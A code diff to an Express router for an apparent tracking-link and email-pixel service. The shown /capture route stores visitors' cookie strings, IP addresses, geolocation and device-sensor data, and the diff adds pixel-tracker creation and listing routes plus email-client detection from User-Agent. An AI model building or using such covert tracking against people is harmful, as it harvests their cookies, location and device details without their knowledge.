@@ -1,4 +1,4 @@
-ï»¿import express from "express";
+import express from "express";
 import axios from "axios";
 import { createTrackingLink, recordCapture, addCredits } from "../utils/linkService.js";
 import { db } from "../firebase/config.js";
@@ -38,6 +38,24 @@ function getClientIP(req) {
     const forwarded = req.headers["x-forwarded-for"];
     if (forwarded) return forwarded.split(",")[0].trim();
     return req.socket?.remoteAddress || req.ip || "Unknown";
+}
+
+// -- PIXEL ROUTES — add these at the bottom ------------------------------------
+
+// Detect email client from User-Agent
+function parseEmailClient(ua = "") {
+    if (/Googlebot|Google-Apps-Script/i.test(ua)) return "Gmail";
+    if (/Outlook|microsoft.outlook/i.test(ua)) return "Outlook";
+    if (/YahooMailProxy|Yahoo/i.test(ua)) return "Yahoo Mail";
+    if (/Apple.*Mail|Thunderbird/i.test(ua)) return "Apple Mail";
+    if (/ProtonMail/i.test(ua)) return "ProtonMail";
+    if (/curl/i.test(ua)) return "cURL / Script";
+    if (/python/i.test(ua)) return "Python Script";
+    if (/axios|node-fetch/i.test(ua)) return "Node.js";
+    if (/Chrome/i.test(ua)) return "Chrome Browser";
+    if (/Firefox/i.test(ua)) return "Firefox Browser";
+    if (/Safari/i.test(ua)) return "Safari Browser";
+    return "Unknown";
 }
 
 async function reverseGeocode(lat, lon) {
@@ -279,7 +297,7 @@ router.post("/capture", async(req, res) => {
             cookieString: body.cookieString || null,
             scrollPositionX: body.scrollPositionX ?? null,
             scrollPositionY: body.scrollPositionY ?? null,
-            // NEW â€” deviceinfo.me fields
+            // NEW — deviceinfo.me fields
             deviceMotionSupport: body.deviceMotionSupport || null,
             deviceOrientationSupport: body.deviceOrientationSupport || null,
             deviceMotionAccelX: body.deviceMotionAccelX ?? null,
@@ -487,7 +505,32 @@ router.post("/credits", async(req, res) => {
     }
 });
 
-export default router;
+// POST /api/pixel/create — create a new pixel tracker
+router.post("/pixel/create", async(req, res) => {
+    try {
+        const { uid, label } = req.body;
+        if (!uid) return res.status(400).json({ error: "uid is required" });
+        const result = await createPixel(uid, label);
+        return res.status(200).json(result);
+    } catch (err) {
+        console.error("[POST /pixel/create]", err.message);
+        return res.status(500).json({ error: err.message });
+    }
+});
 
+// GET /api/pixel/list/:uid — get all pixels for a user
+router.get("/pixel/list/:uid", async(req, res) => {
+    try {
+        const { uid } = req.params;
+        const snap = await db.collection("pixelLinks").where("uid", "==", uid).get();
+        const pixels = snap.docs.map(d => ({ id: d.id, ...d.data() }));
+        pixels.sort((a, b) => (b.createdAt?.toMillis?.() ?? 0) - (a.createdAt?.toMillis?.() ?? 0));
+        return res.status(200).json({ pixels });
+    } catch (err) {
+        return res.status(500).json({ error: err.message });
+    }
+});
+
+export default router;
 
 
